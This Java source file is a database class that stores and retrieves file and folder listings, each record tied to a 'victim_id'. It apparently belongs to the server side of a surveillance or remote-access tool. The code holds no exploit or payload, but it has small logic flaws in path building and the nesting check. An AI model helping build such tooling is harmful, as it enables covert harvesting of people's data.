package com.theah64.xrob.api.database.tables;

import com.sun.istack.internal.Nullable;
import com.theah64.xrob.api.database.Connection;
import com.theah64.xrob.api.models.File;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by theapache64 on 16/9/16,9:25 PM.
 */
public class Files extends BaseTable<File> {

    private static final String COLUMN_FILE_NAME = "file_name";
    private static final String COLUMN_PARENT_ID = "parent_id";
    private static final String COLUMN_IS_DIRECTORY = "is_directory";
    private static final String COLUMN_FILE_SIZE_IN_KB = "file_size_in_kb";
    private static final String COLUMN_ABSOLUTE_PARENT_PATH = "absolute_parent_path";
    private static final String ABSOLUTE_ROOT = "/";

    private Files() {
    }

    private static final Files instance = new Files();

    public static Files getInstance() {
        return instance;
    }

    @Override
    public void addv2(@Nullable String victimId, JSONArray jaFiles) throws RuntimeException, JSONException {
        final String query = "INSERT INTO files (victim_id,file_id,absolute_parent_path,file_name,parent_id,is_directory,file_size_in_kb) VALUES (?,?,?,?,?,?,?);";
        final java.sql.Connection con = Connection.getConnection();
        try {
            final PreparedStatement ps = con.prepareStatement(query);
            ps.setString(1, victimId);
            insert(ps, ABSOLUTE_ROOT, "0", jaFiles);
            ps.close();
        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
    }

    private void insert(PreparedStatement ps, String absoluteParentPath, final String parentId, JSONArray jaFiles) throws JSONException, SQLException {

        for (int i = 0; i < jaFiles.length(); i++) {

            final JSONObject joFile = jaFiles.getJSONObject(i);
            final String id = joFile.getString("id");
            final String name = joFile.getString("name");
            final long size = joFile.getLong("size");
            final boolean isDirectory = joFile.has("files");
            absoluteParentPath = absoluteParentPath + name;


            ps.setString(2, id);
            ps.setString(3, absoluteParentPath);
            ps.setString(4, name);
            ps.setString(5, parentId);
            ps.setBoolean(6, isDirectory);
            ps.setLong(7, size);

            if (ps.executeUpdate() != 1) {
                throw new SQLException("Failed to add file");
            }

            if (isDirectory) {
                final JSONArray jaFiles2 = joFile.getJSONArray("files");
                if (jaFiles.length() > 0) {
                    insert(ps, absoluteParentPath, id, jaFiles2);
                    absoluteParentPath = ABSOLUTE_ROOT;
                }
            }


        }
    }

    @Override
    public List<File> getAll(String victimId, String fileParentId) {
        List<File> files = null;
        final String query = " SELECT id,file_name,absolute_parent_path,file_size_in_kb, is_directory FROM files WHERE victim_id = ? AND parent_id = ? AND is_active =1;";
        final java.sql.Connection con = Connection.getConnection();
        try {
            final PreparedStatement ps = con.prepareStatement(query);
            ps.setString(1, victimId);
            ps.setString(2, fileParentId);

            final ResultSet rs = ps.executeQuery();
            if (rs.first()) {
                files = new ArrayList<>();
                do {
                    final String id = rs.getString(COLUMN_ID);
                    final String fileName = rs.getString(COLUMN_FILE_NAME);
                    final String absoluteParentPath = rs.getString(COLUMN_ABSOLUTE_PARENT_PATH);
                    final String fileSizeInKB = rs.getString(COLUMN_FILE_SIZE_IN_KB);
                    final boolean isDirectory = rs.getBoolean(COLUMN_IS_DIRECTORY);


                    files.add(new File(id, fileName, absoluteParentPath, fileSizeInKB, isDirectory));
                } while (rs.next());
            }

            rs.close();
            ps.close();

        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
        return files;
    }
}
